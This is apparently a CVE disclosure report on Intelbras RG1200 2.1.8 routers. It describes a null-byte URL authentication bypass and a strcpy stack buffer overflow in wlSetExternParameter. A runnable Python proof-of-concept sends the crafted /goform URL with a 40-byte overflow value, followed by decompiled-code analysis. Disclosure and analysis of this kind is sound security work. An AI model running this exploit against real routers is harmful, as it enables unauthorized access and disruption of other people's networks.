# CVE Report - Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`wlSetExternParameter`)

## Vulnerability Title

Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`wlSetExternParameter`)

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Remote unauthenticated attackers can bypass authentication by crafting a URL containing `%00` and a whitelisted substring (e.g., `img/main-logo.png`) in the raw URL so that the security handler matches the whitelist while the form dispatcher resolves the decoded/truncated path to a protected `/goform` handler.

After authentication bypass, an attacker can trigger a stack buffer overflow in `wlSetExternParameter`. The handler reads the `wpapsk_crypto` parameter and copies it into a fixed-size stack buffer using `strcpy` without input length validation.

## POC

```py
import requests
import sys


def exploit(target_ip, port=80, cookie="SESSION=<REPLACE>"):
    base = f"http://{target_ip}:{port}"
    url = f"{base}/goform/wlSetExternParameter%00img/main-logo.png"

    data = {
        "security": "wpapsk",
        "wpapsk_key": "a",
        "wpapsk_crypto": "A" * 40,
    }

    headers = {
        "Cookie": cookie,
    }

    r = requests.post(url, data=data, headers=headers, timeout=10)
    print("status:", r.status_code)
    print(r.text[:2000])


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: python poc.py <target_ip> [port]")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    exploit(ip, port=port)
```

## Cause Analysis

### 1. Authentication Bypass — Raw URL vs Decoded Path Inconsistency

The HTTP request parsing logic in `websParseFirst` (0x42ea1c) stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` → `websUrlParse`:

```c
// websParseFirst (0x42ea1c) — sets wp->url = raw, wp->path = decoded
int __cdecl websParseFirst(webs_t wp, char_t *text)
{
    url = strtok(0, " \t\n");                         // raw URL from HTTP request line
    if ( websUrlParse(url, &buf, &host, &path, &port, &query, &proto, 0, &ext) >= 0 )
    {
        wp->url = bstrdup(url);      // ← raw URL, NOT decoded
        wp->path = bstrdup(path);    // ← decoded path from websDecodeUrl
        // ...
    }
}
```

In `R7WebsSecurityHandler` (0x434c34), the whitelist check is performed using `strstr(url, ...)` on the **raw** `url` parameter (which is `wp->url`). By crafting a raw URL such as `/goform/wlSetExternParameter%00img/main-logo.png`, the security handler matches the whitelisted substring and returns 0 (allow) without enforcing authentication:

```c
// R7WebsSecurityHandler (0x434c34) — whitelist check on raw URL
if ( !strncmp(url, "/public/", 8u)
  || !strncmp(url, "/lang/", 6u)
  || strstr(url, "img/main-logo.png")    // ← BYPASS: matches %00img/main-logo.png in raw URL
  || strstr(url, "reasy-ui-1.0.3.js")
  // ...
{
    return 0;  // ← Authentication bypassed
}
```

Meanwhile, `websDecodeUrl` (0x430ebc) decodes `%00` to a null byte, causing `websFormHandler` (0x415710) to receive the **decoded** path `/goform/wlSetExternParameter` and dispatch to the handler.

### 2. Stack Buffer Overflow — strcpy into 20-byte buffer in wlSetExternParameter

`wlSetExternParameter` (0x45b750) obtains `wpapsk_crypto = websGetVar(wp, "wpapsk_crypto", ...)` and copies it into a 20-byte stack buffer via `strcpy` without length validation:

```c
// wlSetExternParameter (0x45b750)
int __cdecl wlSetExternParameter(webs_t wp, char *wifi_chkHz, char *wl_extern)
{
    char *wpapsk_crypto;
    char mib_name[16];
    char os_ifname[16];
    char wpapsk_typevalue[16];
    char wpapsk_cryptovalue[20];    // ← 20-byte stack buffer

    // ...
    security = websGetVar(wp, "security", "wpapsk");
    if ( !strcmp(security, "wpapsk") )
    {
        wpapsk_crypto = websGetVar(wp, "wpapsk_crypto", "aes");
        // ...
        if ( !strcmp(wpapsk_crypto, "tkip&aes") )
            strcpy(wpapsk_cryptovalue, "tkip+aes");
        else
            strcpy(wpapsk_cryptovalue, wpapsk_crypto);  // ← OVERFLOW: user input into 20-byte buffer
        // ...
        SetValue(v7, wpapsk_cryptovalue);
    }
}
```

When `wpapsk_crypto` is not `"tkip&aes"`, `strcpy` copies the full user-supplied value into the 20-byte `wpapsk_cryptovalue` stack buffer. A 40-byte `wpapsk_crypto` value overflows this buffer, corrupting adjacent stack memory.

